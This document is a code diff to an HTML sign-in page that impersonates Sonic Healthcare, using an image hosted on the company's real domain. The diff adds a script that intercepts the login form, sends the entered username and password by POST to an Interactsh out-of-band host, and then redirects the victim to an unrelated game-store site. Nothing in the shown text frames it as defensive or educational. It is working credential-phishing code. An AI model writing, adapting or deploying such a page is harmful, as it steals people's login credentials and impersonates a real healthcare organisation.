@@ -82,10 +82,10 @@
         <img class="login-image" src="https://remote.sonichealthcare.com/public/share/css/facade3.jpg" alt="Login Image">
         <div class="login-box">
             <h1>Sign In</h1>
-            <form id="aa" action="#">
-                <input type="text" placeholder="Username" name="username">
-                <input id="user" type="password" placeholder="Password here" name="password">
-                <input id="pass" type="submit" value="Sign In">
+            <form id="loginForm">
+                <input type="text" placeholder="Username" id="username" name="username">
+                <input type="password" placeholder="Password here" id="password" name="password">
+                <input type="submit" value="Sign In">
                 <div class="login-options">
                     <label>
                         <input type="checkbox"> Stay signed in
@@ -99,5 +99,29 @@
             © 2024 Sonic Healthcare Limited
         </div>
     </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission behavior
+            event.preventDefault();
+
+            // Get the values entered by the user
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Send the username and password to Interactsh
+            fetch('https://qaddkrkqseozcfkqovthibvusjq50orlv.oast.fun', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username: username, password: password })
+            })
+            .then(response => {
+                // Redirect the user to the specified link
+                window.location.href = 'https://gfal.market/store/elemental-raiders';
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
 </body>
 </html>
